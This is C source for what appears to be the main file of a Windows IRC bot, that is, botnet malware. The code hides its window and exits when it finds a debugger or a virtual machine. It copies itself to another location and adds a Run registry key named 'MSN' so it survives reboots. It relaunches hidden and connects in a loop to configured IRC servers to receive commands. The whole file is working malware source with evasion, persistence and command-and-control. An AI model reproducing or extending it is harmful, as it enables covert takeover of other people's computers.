#include "Headers/includes.h"
#include "Headers/functions.h"
#include "Config/config.h"


#pragma comment(linker, "/subsystem:windows ")


DWORD dwstarted;
DWORD dwconnected;

IRC mainirc;
HANDLE xetum;
int curserver;
int srvsz=(sizeof(sinfo)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));

char exip[MAX_IP];
char inip[MAX_IP];
char host[MAX_HOSTNAME];

extern char str_main_thread[];
extern char str_rup_thread[];
extern char str_asecure_thread[];

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	#ifndef NO_INSTALL
	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
	#endif

	LoadDLLs();

	#ifndef NO_ANTIDEBUG
	HANDLE hProcess;
	hProcess = GetCurrentProcess();
	if (IsDebuggerRunning(hProcess) == TRUE)
	{
		#ifdef DEBUG
		DebugMsg("Debugger is running !");
		#endif
		ExitProcess(0);
	}
	CloseHandle(hProcess);
	#endif

#ifndef NO_ANTIVM
	if (IsProcessRunningUnderVM()==TRUE)
	{
#ifdef DEBUG
		DebugMsg("VM is running !");
#endif
		ExitProcess(0);
	}
#endif

#ifndef NO_INSTALL

	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
#ifndef NO_MELT
	sprintf(spath,"%s\\%s",movetopath,exename);
	if (MoveBot(movetopath,exename))
	{
#else
	strcpy(spath, cpbot);
#endif
		HKEY hndKey = NULL;
		RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
		RegSetValueEx(hndKey, "MSN", 0, REG_SZ,(const unsigned char *)spath,strlen(exename));
		RegCloseKey(hndKey);
#ifndef NO_MELT
		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;
		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
		ExitProcess(1);
#endif
#ifndef NO_MELT
	}
#endif

#endif // NO_INSTALL

	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Bthd, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);

	return 0;
}


DWORD WINAPI Bthd(LPVOID param)
{

	//////////////////////////////////////////
	// Better way to create / check a mutex //
	//////////////////////////////////////////
	xetum = CreateMutex(NULL, FALSE, xetumhandle);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);

	addthread(MAIN_THREAD,str_main_thread,main_title);

	srand(GetTickCount());
	dwstarted=GetTickCount();


	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);


	int i=0;
	DWORD id=0;

	//get internal ip
	char *ip;
	char hostname[256];
	struct hostent *h;
	fgethostname(hostname, 256);
	h = fgethostbyname(hostname);
	ip = finet_ntoa(*(struct in_addr *)h->h_addr_list[0]);
	strncpy(inip,ip,sizeof(inip));


	curserver=0;
	HookProtocol(&mainirc);

	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
#ifndef NO_FLUSHDNS
			FlushDNSCache();
#endif
			mainirc.start(sinfo[curserver].host,sinfo[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),sinfo[curserver].pass);
			mainirc.message_loop();
		}
		else
			mainirc.message_loop();

		Sleep(SFLOOD_DELAY);

		if (curserver==(srvsz-1))
			curserver=0;
		else
			curserver++;
	}

	fWSACleanup();
	ReleaseMutex(xetum);
	ExitThread(0);

	return 0;
}